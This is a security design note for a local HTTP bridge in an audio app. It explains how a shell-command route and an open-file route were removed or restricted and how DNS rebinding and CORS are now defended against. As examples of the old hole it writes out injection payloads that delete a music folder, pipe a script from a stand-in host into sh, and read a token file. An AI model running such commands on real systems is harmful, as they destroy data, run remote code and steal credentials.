# Localhost bridge — security model

**Hardened:** 2026-11-02, branch `security/bridge-no-shell`.

The bridge listens on `127.0.0.1:47821` so a DAW-side client can ask Wavi about
the user's projects. Loopback is not a security boundary: every process on the
machine can reach it, and — through the user's browser — so can a web page.

## What was wrong

### 1. `POST /run-command` was remote code execution

It took a string, matched it against prefix regexes, and passed the **whole
string** to `/bin/sh -c`:

```ts
const COMMAND_ALLOWLIST = [/^ls(\s|$)/, /^echo(\s|$)/, /^cat\s/, /^python3?\s/, /^node\s/, …];
if (COMMAND_ALLOWLIST.some(re => re.test(cmd))) await execFileAsync('/bin/sh', ['-c', cmd]);
```

A shell takes `;`, `&&`, `|` and `$()`, so any payload starting with an
approved word carried whatever followed:

```
echo hi; rm -rf ~/Music
ls && curl http://evil.example/x.sh | sh
echo $(cat ~/.wavi/bridge-token)
```

`python3 -c` and `node -e` were allowlisted outright, needing no cleverness at
all. The allowlist was decorative.

**Nothing in Wavi ever called this route.** It was removed. There is no safer
shell in its place — a client that needs something asks for that thing by name
through a typed route.

### 2. `POST /open-file` was the same hole without a shell

```ts
if (!fs.existsSync(filePath)) { … }
await shell.openPath(filePath);     // any path at all
```

`shell.openPath` **launches** a `.app` bundle and **runs** a `.command` or
`.sh` in Terminal. Removing `/run-command` while leaving this would have
achieved nothing. `/open-folder` did not even check existence, and a `.app` is
a folder.

Both now require the target to be **indexed in the user's library** — so a
caller can point at the user's own files, not name an arbitrary path — and
refuse anything macOS or Windows would execute. The type check is not
redundant with the index: dropping `payload.command` into a watched music
folder is easy.

### 3. The trust model around it

| Was | Now |
|---|---|
| `Access-Control-Allow-Origin: *` on every response | no CORS header at all |
| `OPTIONS` answered a permissive preflight | `405` — browsers are not clients |
| no `Host` validation | rebound DNS names rejected |
| no `Origin` check | any request carrying `Origin` refused |
| `token !== expected` | `timingSafeEqual` |
| stored token accepted if `length === 36` | must be a real UUID |
| `/health` unauthenticated and unguarded | still unauthenticated, now host/origin guarded |

**DNS rebinding** is why the `Host` check matters: an attacker's page can point
`evil.example` at `127.0.0.1`, so the connection genuinely arrives on loopback
and checking the peer address proves nothing. The `Host` header still carries
the attacker's domain.

Host and origin are checked **before** the token, so a page cannot probe token
guesses through status codes or timing.

## What is preserved

Every other route is untouched: `/project-context`, `/project-files`,
`/project-versions`, `/latest-bounce`, `/search-files`, `/generate-midi`,
`/analyze-latest-bounce`, `/classify-file`, `/chat`, `/log-action`,
`/pending-associations`, `/confirm-association`, `/open-copilot-panel`,
`/reveal-file`, `/health`. The existing contract validator
(`scripts/validate-bridge.cjs`, 40 checks) still passes.

## How it is proved

`electron/bridgeSecurity.test.ts` — 29 tests, two kinds:

**Structural.** The bridge source contains no `child_process`, `execFile`,
`spawn`, `/bin/sh`, `eval(` or `new Function(`, and no route reads a
`body.command`. Comments are stripped first, since prose about shells is not a
shell. This is the stronger half: behaviour tests prove the doors you thought
of are locked; reading the source proves there is no door.

**Behavioural.** Each historical bypass payload is named and asserted to have
no route. The guard rules are tested directly: missing/wrong/short token,
rebound host, `Origin` present, check ordering, `/health` coverage, and the
open-path rules for `.app`, `.command`, `.sh`, `.py`, `.exe`, extensionless
files, NUL bytes, un-indexed paths, and ordinary audio files.

## Residual risk, stated plainly

- Any local process that can **read `~/.wavi/bridge-token`** (mode `0600`) can
  still use the bridge as the user. That is the design: the token is the
  boundary. It no longer grants a shell.
- `/chat` reaches the assistant, which can propose actions. Those run through
  the Agent Actions allowlist and confirmation gate, not through this bridge.
- **None of this has been verified against a running server.** `bridgeServer.ts`
  imports the Electron-ABI database, so it cannot be instantiated under vitest,
  and ENV-1 prevents launching the app. The guard logic is pure and directly
  tested; the wiring is verified by source extraction. A live test of the HTTP
  surface remains outstanding.
